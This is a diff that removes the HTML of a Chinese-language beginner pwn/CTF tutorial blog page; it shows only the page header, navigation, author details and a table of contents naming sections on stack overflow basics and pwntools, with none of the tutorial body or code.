@@ -1,1612 +1,0 @@
-<!DOCTYPE html>
-<html class="scroll-smooth" data-auto-appearance="false" data-default-appearance="dark" dir="ltr" lang="CN"><head>
-<script>
-    var _hmt = _hmt || [];
-    (function() {
-      var hm = document.createElement("script");
-      hm.src = "https://hm.baidu.com/hm.js?f260c483ac9fab4fdd9fd55057878c8c";
-      var s = document.getElementsByTagName("script")[0]; 
-      s.parentNode.insertBefore(hm, s);
-    })();
-    </script>
-<meta charset="utf-8"/>
-<meta content="zh-cn" http-equiv="content-language"/>
-<meta content="width=device-width, initial-scale=1.0" name="viewport"/>
-<meta content="ie=edge" http-equiv="X-UA-Compatible"/>
-<title>pwn入门教程 · ta0lve</title>
-<meta content="pwn入门教程 · ta0lve" name="title"/>
-<meta content="CTF, PWN, " name="keywords"/>
-<link href="https://ta0lve.github.io/posts/pwn/basic/tutorial1/" rel="canonical"/>
-<link href="/css/main.bundle.min.c6116b9ed1c907a8c0eb015f377d3eecc07e448d75729e31fc3de5881465c6c172ba9fa9a6800c030116caf2a110d92242bb816639484ca791f7cd107a8d49b5.css" integrity="sha512-xhFrntHJB6jA6wFfN30+7MB+RI11cp4x/D3liBRlxsFyup+ppoAMAwEWyvKhENkiQruBZjlITKeR980Qeo1JtQ==" rel="stylesheet" type="text/css"/>
-<script integrity="sha512-UWoWdFvqWpvQERONJUzA/TlzzVXObhXz3sdj58fCx0SPj+e1TMqBHLghsMfhLNFhyqzh3XlKw9NNQJN8vMnuEg==" src="/js/appearance.min.516a16745bea5a9bd011138d254cc0fd3973cd55ce6e15f3dec763e7c7c2c7448f8fe7b54cca811cb821b0c7e12cd161caace1dd794ac3d34d40937cbcc9ee12.js" type="text/javascript"></script>
-<script data-copied="" data-copy="" defer="" id="script-bundle" integrity="sha512-PdzwT1sNTDL3LnJtPBLuvM2MPJ+dqpoTQUgIiV3grh4c3d2mhJaA1b2W27YNCx4LJMKfXIPlYx5V5+a8AgFUkA==" src="/js/main.bundle.min.3ddcf04f5b0d4c32f72e726d3c12eebccd8c3c9f9daa9a13414808895de0ae1e1cdddda6849680d5bd96dbb60d0b1e0b24c29f5c83e5631e55e7e6bc02015490.js" type="text/javascript"></script>
-<script src="/js/zoom.min.js"></script>
-<link href="/apple-touch-icon.png" rel="apple-touch-icon" sizes="180x180"/>
-<link href="/favicon-32x32.png" rel="icon" sizes="32x32" type="image/png"/>
-<link href="/favicon-16x16.png" rel="icon" sizes="16x16" type="image/png"/>
-<link href="/site.webmanifest" rel="manifest"/>
-<meta content="pwn入门教程" property="og:title"/>
-<meta content="写给学弟学妹的pwn入门教程~" property="og:description"/>
-<meta content="article" property="og:type"/>
-<meta content="https://ta0lve.github.io/posts/pwn/basic/tutorial1/" property="og:url"/><meta content="https://ta0lve.github.io/posts/pwn/basic/tutorial1/featured.jpg" property="og:image"/><meta content="posts" property="article:section"/>
-<meta content="2023-08-05T00:00:00+00:00" property="article:published_time"/>
-<meta content="2023-08-05T00:00:00+00:00" property="article:modified_time"/>
-<meta content="summary_large_image" name="twitter:card"/>
-<meta content="https://ta0lve.github.io/posts/pwn/basic/tutorial1/featured.jpg" name="twitter:image"/>
-<meta content="pwn入门教程" name="twitter:title"/>
-<meta content="写给学弟学妹的pwn入门教程~" name="twitter:description"/>
-<script type="application/ld+json">
-  [{
-    "@context": "https://schema.org",
-    "@type": "Article",
-    "articleSection": "Posts",
-    "name": "pwn入门教程",
-    "headline": "pwn入门教程",
-    
-    "abstract": "\u003cp\u003e写给学弟学妹的pwn入门教程~\u003c\/p\u003e",
-    "inLanguage": "zh-cn",
-    "url" : "https:\/\/ta0lve.github.io\/posts\/pwn\/basic\/tutorial1\/",
-    "author" : {
-      "@type": "Person",
-      "name": "ta0lve"
-    },
-    "copyrightYear": "2023",
-    "dateCreated": "2023-08-05T00:00:00\u002b00:00",
-    "datePublished": "2023-08-05T00:00:00\u002b00:00",
-    
-    "dateModified": "2023-08-05T00:00:00\u002b00:00",
-    
-    "keywords": ["CTF","PWN"],
-    
-    "mainEntityOfPage": "true",
-    "wordCount": "5811"
-  }]
-  </script>
-<meta content="ta0lve" name="author"/>
-<link href="mailto:hujt25@mail2.sysu.edu.cn" rel="me"/>
-<link href="https://ta0lve.github.io/" rel="me"/>
-<link href="https://github.com/ta0lve" rel="me"/>
-<script integrity="" src="/lib/jquery/jquery.slim.min.js"></script>
-<meta name="theme-color"/>
-</head>
-<body class="flex flex-col h-screen px-6 m-auto text-lg leading-7 max-w-7xl bg-neutral text-neutral-900 dark:bg-neutral-800 dark:text-neutral sm:px-14 md:px-24 lg:px-32">
-<div class="absolute flex self-center" id="the-top">
-<a class="px-3 py-1 text-sm -translate-y-8 rounded-b-lg bg-primary-200 focus:translate-y-0 dark:bg-neutral-600" href="#main-content"><span class="font-bold text-primary-600 ltr:pr-2 rtl:pl-2 dark:text-primary-400">↓</span></a>
-</div>
-<div class="min-h-[148px]"></div>
-<div class="fixed inset-x-0 pl-[24px] pr-[24px]" style="z-index:100">
-<div class="absolute opacity-0 inset-x-0 top-0 h-full single_hero_background nozoom backdrop-blur-2xl shadow-2xl" id="menu-blur"></div>
-<div class="relative max-w-[64rem] ml-auto mr-auto">
-<div class="main-menu flex items-center justify-between px-4 py-6 sm:px-6 md:justify-start space-x-3" style="padding-left:0;padding-right:0;padding-top:2px;padding-bottom:3px">
-<div class="flex flex-1 items-center justify-between">
-<nav class="flex space-x-3">
-<a class="text-base font-medium text-gray-500 hover:text-gray-900" href="/">ta0lve</a>
-</nav>
-<nav class="hidden md:flex items-center space-x-5 md:ml-12 h-12">
-<a class="flex items-center" href="/posts/">
-<p class="text-base font-medium text-gray-500 hover:text-gray-900" title="Posts">
-        Posts
-    </p>
-</a>
-<a class="flex items-center" href="/categories/">
-<p class="text-base font-medium text-gray-500 hover:text-gray-900" title="Categories">
-        分类
-    </p>
-</a>
-<a class="flex items-center" href="/tags/">
-<p class="text-base font-medium text-gray-500 hover:text-gray-900" title="Tags">
-        标签
-    </p>
-</a>
-<a class="flex items-center" href="/link/">
-<p class="text-base font-medium text-gray-500 hover:text-gray-900" title="友链/links">
-        友链
-    </p>
-</a>
-<a class="flex items-center" href="/about/">
-<p class="text-base font-medium text-gray-500 hover:text-gray-900" title="About">
-        About
-    </p>
-</a>
-<button aria-label="Search" class="text-base hover:text-primary-600 dark:hover:text-primary-400 h-12" id="search-button" title="">
-<span class="relative block icon">
-<svg aria-hidden="true" class="svg-inline--fa fa-search fa-w-16" data-icon="search" data-prefix="fas" focusable="false" role="img" viewbox="0 0 512 512" xmlns="http://www.w3.org/2000/svg"><path d="M505 442.7L405.3 343c-4.5-4.5-10.6-7-17-7H372c27.6-35.3 44-79.7 44-128C416 93.1 322.9 0 208 0S0 93.1 0 208s93.1 208 208 208c48.3 0 92.7-16.4 128-44v16.3c0 6.4 2.5 12.5 7 17l99.7 99.7c9.4 9.4 24.6 9.4 33.9 0l28.3-28.3c9.4-9.4 9.4-24.6.1-34zM208 336c-70.7 0-128-57.2-128-128 0-70.7 57.2-128 128-128 70.7 0 128 57.2 128 128 0 70.7-57.2 128-128 128z" fill="currentColor"></path></svg>
-</span>
-</button>
-<div class="ltr:mr-14 rtl:ml-14 cursor-pointer text-sm text-neutral-700 hover:text-primary-600 dark:text-neutral dark:hover:text-primary-400">
-<button aria-label="Dark mode switcher" id="appearance-switcher" type="button">
-<div class="flex items-center justify-center h-12 dark:hidden">
-<span class="relative block icon">
-<svg viewbox="0 0 512 512" xmlns="http://www.w3.org/2000/svg"><path d="M32 256c0-123.8 100.3-224 223.8-224c11.36 0 29.7 1.668 40.9 3.746c9.616 1.777 11.75 14.63 3.279 19.44C245 86.5 211.2 144.6 211.2 207.8c0 109.7 99.71 193 208.3 172.3c9.561-1.805 16.28 9.324 10.11 16.95C387.9 448.6 324.8 480 255.8 480C132.1 480 32 379.6 32 256z" fill="currentColor"></path></svg>
-</span>
-</div>
-<div class="items-center justify-center hidden h-12 dark:flex">
-<span class="relative block icon">
-<svg viewbox="0 0 512 512" xmlns="http://www.w3.org/2000/svg"><path d="M256 159.1c-53.02 0-95.1 42.98-95.1 95.1S202.1 351.1 256 351.1s95.1-42.98 95.1-95.1S309 159.1 256 159.1zM509.3 347L446.1 255.1l63.15-91.01c6.332-9.125 1.104-21.74-9.826-23.72l-109-19.7l-19.7-109c-1.975-10.93-14.59-16.16-23.72-9.824L256 65.89L164.1 2.736c-9.125-6.332-21.74-1.107-23.72 9.824L121.6 121.6L12.56 141.3C1.633 143.2-3.596 155.9 2.736 164.1L65.89 256l-63.15 91.01c-6.332 9.125-1.105 21.74 9.824 23.72l109 19.7l19.7 109c1.975 10.93 14.59 16.16 23.72 9.824L256 446.1l91.01 63.15c9.127 6.334 21.75 1.107 23.72-9.822l19.7-109l109-19.7C510.4 368.8 515.6 356.1 509.3 347zM256 383.1c-70.69 0-127.1-57.31-127.1-127.1c0-70.69 57.31-127.1 127.1-127.1s127.1 57.3 127.1 127.1C383.1 326.7 326.7 383.1 256 383.1z" fill="currentColor"></path></svg>
-</span>
-</div>
-</button>
-</div>
-</nav>
-<div class="flex md:hidden items-center space-x-5 md:ml-12">
-<span></span>
-<button aria-label="Search" class="text-base hover:text-primary-600 dark:hover:text-primary-400" id="search-button-mobile" title="">
-<span class="relative block icon">
-<svg aria-hidden="true" class="svg-inline--fa fa-search fa-w-16" data-icon="search" data-prefix="fas" focusable="false" role="img" viewbox="0 0 512 512" xmlns="http://www.w3.org/2000/svg"><path d="M505 442.7L405.3 343c-4.5-4.5-10.6-7-17-7H372c27.6-35.3 44-79.7 44-128C416 93.1 322.9 0 208 0S0 93.1 0 208s93.1 208 208 208c48.3 0 92.7-16.4 128-44v16.3c0 6.4 2.5 12.5 7 17l99.7 99.7c9.4 9.4 24.6 9.4 33.9 0l28.3-28.3c9.4-9.4 9.4-24.6.1-34zM208 336c-70.7 0-128-57.2-128-128 0-70.7 57.2-128 128-128 70.7 0 128 57.2 128 128 0 70.7-57.2 128-128 128z" fill="currentColor"></path></svg>
-</span>
-</button>
-<button aria-label="Dark mode switcher" id="appearance-switcher-mobile" style="margin-right:5px" type="button">
-<div class="flex items-center justify-center h-12 dark:hidden">
-<span class="relative block icon">
-<svg viewbox="0 0 512 512" xmlns="http://www.w3.org/2000/svg"><path d="M32 256c0-123.8 100.3-224 223.8-224c11.36 0 29.7 1.668 40.9 3.746c9.616 1.777 11.75 14.63 3.279 19.44C245 86.5 211.2 144.6 211.2 207.8c0 109.7 99.71 193 208.3 172.3c9.561-1.805 16.28 9.324 10.11 16.95C387.9 448.6 324.8 480 255.8 480C132.1 480 32 379.6 32 256z" fill="currentColor"></path></svg>
-</span>
-</div>
-<div class="items-center justify-center hidden h-12 dark:flex">
-<span class="relative block icon">
-<svg viewbox="0 0 512 512" xmlns="http://www.w3.org/2000/svg"><path d="M256 159.1c-53.02 0-95.1 42.98-95.1 95.1S202.1 351.1 256 351.1s95.1-42.98 95.1-95.1S309 159.1 256 159.1zM509.3 347L446.1 255.1l63.15-91.01c6.332-9.125 1.104-21.74-9.826-23.72l-109-19.7l-19.7-109c-1.975-10.93-14.59-16.16-23.72-9.824L256 65.89L164.1 2.736c-9.125-6.332-21.74-1.107-23.72 9.824L121.6 121.6L12.56 141.3C1.633 143.2-3.596 155.9 2.736 164.1L65.89 256l-63.15 91.01c-6.332 9.125-1.105 21.74 9.824 23.72l109 19.7l19.7 109c1.975 10.93 14.59 16.16 23.72 9.824L256 446.1l91.01 63.15c9.127 6.334 21.75 1.107 23.72-9.822l19.7-109l109-19.7C510.4 368.8 515.6 356.1 509.3 347zM256 383.1c-70.69 0-127.1-57.31-127.1-127.1c0-70.69 57.31-127.1 127.1-127.1s127.1 57.3 127.1 127.1C383.1 326.7 326.7 383.1 256 383.1z" fill="currentColor"></path></svg>
-</span>
-</div>
-</button>
-</div>
-</div>
-<div class="-my-2 -mr-2 md:hidden">
-<label class="block" for="menu-controller" id="menu-button">
-<input class="hidden" id="menu-controller" type="checkbox"/>
-<div class="cursor-pointer hover:text-primary-600 dark:hover:text-primary-400">
-<span class="relative block icon">
-<svg viewbox="0 0 448 512" xmlns="http://www.w3.org/2000/svg"><path d="M0 96C0 78.33 14.33 64 32 64H416C433.7 64 448 78.33 448 96C448 113.7 433.7 128 416 128H32C14.33 128 0 113.7 0 96zM0 256C0 238.3 14.33 224 32 224H416C433.7 224 448 238.3 448 256C448 273.7 433.7 288 416 288H32C14.33 288 0 273.7 0 256zM416 448H32C14.33 448 0 433.7 0 416C0 398.3 14.33 384 32 384H416C433.7 384 448 398.3 448 416C448 433.7 433.7 448 416 448z" fill="currentColor"></path></svg>
-</span>
-</div>
-<div class="fixed inset-0 z-30 invisible w-screen h-screen m-auto overflow-auto transition-opacity opacity-0 cursor-default bg-neutral-100/50 backdrop-blur-sm dark:bg-neutral-900/50" id="menu-wrapper" style="padding-top:5px;">
-<ul class="flex space-y-2 mt-3 flex-col items-end w-full px-6 py-6 mx-auto overflow-visible list-none ltr:text-right rtl:text-left max-w-7xl">
-<li>
-<span class="cursor-pointer inline-block align-text-bottom hover:text-primary-600 dark:hover:text-primary-400">
-<span class="relative block icon">
-<svg viewbox="0 0 320 512" xmlns="http://www.w3.org/2000/svg"><path d="M310.6 361.4c12.5 12.5 12.5 32.75 0 45.25C304.4 412.9 296.2 416 288 416s-16.38-3.125-22.62-9.375L160 301.3L54.63 406.6C48.38 412.9 40.19 416 32 416S15.63 412.9 9.375 406.6c-12.5-12.5-12.5-32.75 0-45.25l105.4-105.4L9.375 150.6c-12.5-12.5-12.5-32.75 0-45.25s32.75-12.5 45.25 0L160 210.8l105.4-105.4c12.5-12.5 32.75-12.5 45.25 0s12.5 32.75 0 45.25l-105.4 105.4L310.6 361.4z" fill="currentColor"></path></svg>
-</span>
-</span>
-</li>
-<li class="mt-1">
-<a class="flex items-center" href="/posts/">
-<p class="text-bg font-bg text-gray-500 hover:text-gray-900" title="Posts">
-            Posts
-        </p>
-</a>
-</li>
-<li class="mt-1">
-<a class="flex items-center" href="/categories/">
-<p class="text-bg font-bg text-gray-500 hover:text-gray-900" title="Categories">
-            分类
-        </p>
-</a>
-</li>
-<li class="mt-1">
-<a class="flex items-center" href="/tags/">
-<p class="text-bg font-bg text-gray-500 hover:text-gray-900" title="Tags">
-            标签
-        </p>
-</a>
-</li>
-<li class="mt-1">
-<a class="flex items-center" href="/link/">
-<p class="text-bg font-bg text-gray-500 hover:text-gray-900" title="友链/links">
-            友链
-        </p>
-</a>
-</li>
-<li class="mt-1">
-<a class="flex items-center" href="/about/">
-<p class="text-bg font-bg text-gray-500 hover:text-gray-900" title="About">
-            About
-        </p>
-</a>
-</li>
-</ul>
-</div>
-</label>
-</div>
-</div>
-<script>
-    (function () {
-        var $mainmenu = $('.main-menu');
-        var path = window.location.pathname;
-        $mainmenu.find('a[href="' + path + '"]').each(function (i, e) {
-            $(e).children('p').addClass('active');
-        });
-    })();
-</script>
-</div>
-</div>
-<script>
-  window.addEventListener('scroll', function (e) {
-    var scroll = window.pageYOffset || document.documentElement.scrollTop || document.body.scrollTop || 0;
-    var background_blur = document.getElementById('menu-blur');
-    background_blur.style.opacity = (scroll / 300);
-  });
-</script>
-<div class="relative flex flex-col grow">
-<main class="grow" id="main-content">
-<article>
-<div class="h-[150px] md:h-[200px]" id="hero"></div>
-<div class="fixed inset-x-0 top-0 h-[800px] single_hero_background nozoom" style="background-image:url(/posts/pwn/basic/tutorial1/featured.jpg);">
-<div class="absolute inset-0 bg-gradient-to-t from-neutral dark:from-neutral-800 to-transparent mix-blend-normal">
-</div>
-<div class="absolute inset-0 opacity-60 bg-gradient-to-t from-neutral dark:from-neutral-800 to-neutral-100 dark:to-neutral-800 mix-blend-normal">
-</div>
-</div>
-<div class="fixed opacity-0 inset-x-0 top-0 h-full single_hero_background nozoom backdrop-blur-2xl" id="background-blur"></div>
-<script>
-    window.addEventListener('scroll', function (e) {
-        var scroll = window.pageYOffset || document.documentElement.scrollTop || document.body.scrollTop || 0;
-        var background_blur = document.getElementById('background-blur');
-        background_blur.style.opacity = (scroll / 300)
-    });
-</script>
-<header class="mt-5 max-w-prose" id="single_header">
-<ol class="text-sm text-neutral-500 dark:text-neutral-400 print:hidden">
-<li class="inline hidden">
-<a class="hover:underline decoration-neutral-300 dark:underline-neutral-600" href="/"></a><span class="px-1 text-primary-500">/</span>
-</li>
-<li class="inline">
-<a class="hover:underline decoration-neutral-300 dark:underline-neutral-600" href="/posts/">Posts</a><span class="px-1 text-primary-500">/</span>
-</li>
-<li class="inline hidden">
-<a class="hover:underline decoration-neutral-300 dark:underline-neutral-600" href="/posts/pwn/basic/tutorial1/">pwn入门教程</a><span class="px-1 text-primary-500">/</span>
-</li>
-</ol>
-<h1 class="mt-0 text-4xl font-extrabold text-neutral-900 dark:text-neutral">
-      pwn入门教程
-    </h1>
-<div class="mt-1 mb-6 text-base text-neutral-500 dark:text-neutral-400 print:hidden">
-<div class="flex flex-row flex-wrap items-center">
-<time datetime="2023-08-05 00:00:00 +0000 UTC">August 5, 2023</time><span class="px-2 text-primary-500">·</span><span>5811 字</span><span class="px-2 text-primary-500">·</span><span title="预计阅读">12 分钟</span>
-</div>
-<div class="flex flex-row flex-wrap items-center">
-<span class="mr-2" onclick="window.open(&quot;/categories/pwn%E5%85%A5%E9%97%A8/&quot;,'_self');" style="margin-top:0.5rem">
-<span class="flex">
-<span class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">
-    pwn入门
-  </span>
-</span>
-</span>
-<span class="mr-2" onclick="window.open(&quot;/tags/ctf/&quot;,'_self');" style="margin-top:0.5rem">
-<span class="flex">
-<span class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">
-    CTF
-  </span>
-</span>
-</span>
-<span class="mr-2" onclick="window.open(&quot;/tags/pwn/&quot;,'_self');" style="margin-top:0.5rem">
-<span class="flex">
-<span class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">
-    PWN
-  </span>
-</span>
-</span>
-</div>
-</div>
-<div class="flex">
-<div class="place-self-center">
-<div class="text-[0.6rem] uppercase leading-3 text-neutral-500 dark:text-neutral-400">
-      作者
-    </div>
-<div class="font-semibold leading-6 text-neutral-800 dark:text-neutral-300">
-      ta0lve
-    </div>
-<div class="text-sm text-neutral-700 dark:text-neutral-400">一些记录，一点思考</div>
-<div class="text-2xl sm:text-lg">
-<div class="flex flex-wrap text-neutral-400 dark:text-neutral-500">
-<a aria-label="Email" class="px-1 hover:text-primary-700 dark:hover:text-primary-400" href="mailto:hujt25@mail2.sysu.edu.cn" rel="me noopener noreferrer" target="_blank"><span class="inline-block align-text-bottom">
-<span class="relative block icon">
-<svg viewbox="0 0 512 512" xmlns="http://www.w3.org/2000/svg"><path d="M207.8 20.73c-93.45 18.32-168.7 93.66-187 187.1c-27.64 140.9 68.65 266.2 199.1 285.1c19.01 2.888 36.17-12.26 36.17-31.49l.0001-.6631c0-15.74-11.44-28.88-26.84-31.24c-84.35-12.98-149.2-86.13-149.2-174.2c0-102.9 88.61-185.5 193.4-175.4c91.54 8.869 158.6 91.25 158.6 183.2l0 16.16c0 22.09-17.94 40.05-40 40.05s-40.01-17.96-40.01-40.05v-120.1c0-8.847-7.161-16.02-16.01-16.02l-31.98 .0036c-7.299 0-13.2 4.992-15.12 11.68c-24.85-12.15-54.24-16.38-86.06-5.106c-38.75 13.73-68.12 48.91-73.72 89.64c-9.483 69.01 43.81 128 110.9 128c26.44 0 50.43-9.544 69.59-24.88c24 31.3 65.23 48.69 109.4 37.49C465.2 369.3 496 324.1 495.1 277.2V256.3C495.1 107.1 361.2-9.332 207.8 20.73zM239.1 304.3c-26.47 0-48-21.56-48-48.05s21.53-48.05 48-48.05s48 21.56 48 48.05S266.5 304.3 239.1 304.3z" fill="currentColor"></path></svg>
-</span>
-</span></a>
-<a aria-label="Blogger" class="px-1 hover:text-primary-700 dark:hover:text-primary-400" href="https://ta0lve.github.io/" rel="me noopener noreferrer" target="_blank"><span class="inline-block align-text-bottom">
-<span class="relative block icon">
-<svg viewbox="0 0 448 512" xmlns="http://www.w3.org/2000/svg"><path d="M446.6 222.7c-1.8-8-6.8-15.4-12.5-18.5-1.8-1-13-2.2-25-2.7-20.1-.9-22.3-1.3-28.7-5-10.1-5.9-12.8-12.3-12.9-29.5-.1-33-13.8-63.7-40.9-91.3-19.3-19.7-40.9-33-65.5-40.5-5.9-1.8-19.1-2.4-63.3-2.9-69.4-.8-84.8.6-108.4 10C45.9 59.5 14.7 96.1 3.3 142.9 1.2 151.7.7 165.8.2 246.8c-.6 101.5.1 116.4 6.4 136.5 15.6 49.6 59.9 86.3 104.4 94.3 14.8 2.7 197.3 3.3 216 .8 32.5-4.4 58-17.5 81.9-41.9 17.3-17.7 28.1-36.8 35.2-62.1 4.9-17.6 4.5-142.8 2.5-151.7zm-322.1-63.6c7.8-7.9 10-8.2 58.8-8.2 43.9 0 45.4.1 51.8 3.4 9.3 4.7 13.4 11.3 13.4 21.9 0 9.5-3.8 16.2-12.3 21.6-4.6 2.9-7.3 3.1-50.3 3.3-26.5.2-47.7-.4-50.8-1.2-16.6-4.7-22.8-28.5-10.6-40.8zm191.8 199.8l-14.9 2.4-77.5.9c-68.1.8-87.3-.4-90.9-2-7.1-3.1-13.8-11.7-14.9-19.4-1.1-7.3 2.6-17.3 8.2-22.4 7.1-6.4 10.2-6.6 97.3-6.7 89.6-.1 89.1-.1 97.6 7.8 12.1 11.3 9.5 31.2-4.9 39.4z" fill="currentColor"></path></svg>
-</span>
-</span></a>
-<a aria-label="Github" class="px-1 hover:text-primary-700 dark:hover:text-primary-400" href="https://github.com/ta0lve" rel="me noopener noreferrer" target="_blank"><span class="inline-block align-text-bottom">
-<span class="relative block icon">
-<svg viewbox="0 0 496 512" xmlns="http://www.w3.org/2000/svg"><path d="M165.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6zm-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3zm44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9zM244.8 8C106.1 8 0 113.3 0 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C428.2 457.8 496 362.9 496 252 496 113.3 383.5 8 244.8 8zM97.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1zm-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7zm32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1zm-11.4-14.7c-1.6 1-1.6 3.6 0 5.9 1.6 2.3 4.3 3.3 5.6 2.3 1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2z" fill="currentColor"></path></svg>
-</span>
-</span></a>
-</div>
-</div>
-</div>
-</div>
-<div class="mb-5"></div>
-</header>
-<section class="flex flex-col max-w-full mt-0 prose dark:prose-invert lg:flex-row">
-<div class="order-first sm:max-w-prose lg:ml-auto px-0 lg:order-last lg:max-w-xs ltr:lg:pl-8 rtl:lg:pr-8">
-<div class="toc ltr:pl-5 rtl:pr-5 print:hidden lg:sticky lg:top-10">
-<details class="mt-0 overflow-hidden rounded-lg ltr:-ml-5 ltr:pl-5 rtl:-mr-5 rtl:pr-5 hidden lg:block" open="">
-<summary class="block py-1 text-lg font-semibold cursor-pointer bg-neutral-100 text-neutral-800 ltr:-ml-5 ltr:pl-5 rtl:-mr-5 rtl:pr-5 dark:bg-neutral-700 dark:text-neutral-100 lg:hidden">
-</summary>
-<div class="min-w-[220px] py-2 border-dotted border-neutral-300 ltr:-ml-5 ltr:border-l ltr:pl-5 rtl:-mr-5 rtl:border-r rtl:pr-5 dark:border-neutral-600">
-<nav id="TableOfContents">
-<ul>
-<li><a href="#0x00-概述">0x00 概述</a></li>
-<li><a href="#0x01-入门教程推荐">0x01 入门教程推荐</a></li>
-<li><a href="#0x02-pwn环境与工具">0x02 pwn环境与工具</a></li>
-<li><a href="#0x03-pwn做题平台">0x03 pwn做题平台</a></li>
-<li><a href="#附录">附录</a>
-<ul>
-<li><a href="#1栈溢出原理">1.栈溢出原理</a>
-<ul>
-<li><a href="#基本示例-httpsctf-wikiorgpwnlinuxuser-modestackoverflowx86stackoverflow-basic_3">基本示例 </a><a href="https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/stackoverflow-basic/#_3">¶</a></li>
-<li><a href="#1寻找危险函数-httpsctf-wikiorgpwnlinuxuser-modestackoverflowx86stackoverflow-basic_5">（1）寻找危险函数 </a><a href="https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/stackoverflow-basic/#_5">¶</a></li>
-<li><a href="#2确定填充长度-httpsctf-wikiorgpwnlinuxuser-modestackoverflowx86stackoverflow-basic_6">（2）确定填充长度 </a><a href="https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/stackoverflow-basic/#_6">¶</a></li>
-</ul>
-</li>
-<li><a href="#2基础栈溢出示例">2.基础栈溢出示例：</a>
-<ul>
-<li><a href="#题目源码">题目源码：</a></li>
-<li><a href="#分析二进制文件">分析二进制文件：</a></li>
-<li><a href="#exp">exp：</a></li>
-</ul>
-</li>
-<li><a href="#3-pwntools的基本使用">3. pwntools的基本使用</a></li>
-<li><a href="#4-学习路线">4. 学习路线</a></li>
-<li><a href="#5参考链接">5.参考链接</a></li>
-</ul>
-</li>
-</ul>
-</nav>
-</div>
-</details>
-<details class="mt-0 overflow-hidden rounded-lg ltr:-ml-5 ltr:pl-5 rtl:-mr-5 rtl:pr-5 lg:hidden">
-<summary class="py-1 text-lg font-semibold cursor-pointer bg-neutral-100 text-neutral-800 ltr:-ml-5 ltr:pl-5 rtl:-mr-5 rtl:pr-5 dark:bg-neutral-700 dark:text-neutral-100 lg:hidden">
-</summary>
-<div class="py-2 border-dotted border-neutral-300 ltr:-ml-5 ltr:border-l ltr:pl-5 rtl:-mr-5 rtl:border-r rtl:pr-5 dark:border-neutral-600">
-<nav id="TableOfContents">
-<ul>
-<li><a href="#0x00-概述">0x00 概述</a></li>
-<li><a href="#0x01-入门教程推荐">0x01 入门教程推荐</a></li>
-<li><a href="#0x02-pwn环境与工具">0x02 pwn环境与工具</a></li>
-<li><a href="#0x03-pwn做题平台">0x03 pwn做题平台</a></li>
-<li><a href="#附录">附录</a>
-<ul>
-<li><a href="#1栈溢出原理">1.栈溢出原理</a>
-<ul>
-<li><a href="#基本示例-httpsctf-wikiorgpwnlinuxuser-modestackoverflowx86stackoverflow-basic_3">基本示例 </a><a href="https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/stackoverflow-basic/#_3">¶</a></li>
-<li><a href="#1寻找危险函数-httpsctf-wikiorgpwnlinuxuser-modestackoverflowx86stackoverflow-basic_5">（1）寻找危险函数 </a><a href="https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/stackoverflow-basic/#_5">¶</a></li>
-<li><a href="#2确定填充长度-httpsctf-wikiorgpwnlinuxuser-modestackoverflowx86stackoverflow-basic_6">（2）确定填充长度 </a><a href="https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/stackoverflow-basic/#_6">¶</a></li>
-</ul>
-</li>
-<li><a href="#2基础栈溢出示例">2.基础栈溢出示例：</a>
-<ul>
-<li><a href="#题目源码">题目源码：</a></li>
-<li><a href="#分析二进制文件">分析二进制文件：</a></li>
-<li><a href="#exp">exp：</a></li>
-</ul>
-</li>
-<li><a href="#3-pwntools的基本使用">3. pwntools的基本使用</a></li>
-<li><a href="#4-学习路线">4. 学习路线</a></li>
-<li><a href="#5参考链接">5.参考链接</a></li>
-</ul>
-</li>
-</ul>
-</nav>
-</div>
-</details>
-<script>
-  (function () {
-    var $toc = $('#TableOfContents');
-    if ($toc.length > 0) {
-      var $window = $(window);
-
-      function onScroll() {
-        var currentScroll = $window.scrollTop();
-        var h = $('.anchor');
-        var id = "";
-        h.each(function (i, e) {
-          e = $(e);
-          if (e.offset().top - $(window).height()/3 <= currentScroll) {
-            id = e.attr('id');
-          }
-        });
-        var active = $toc.find('a.active');      
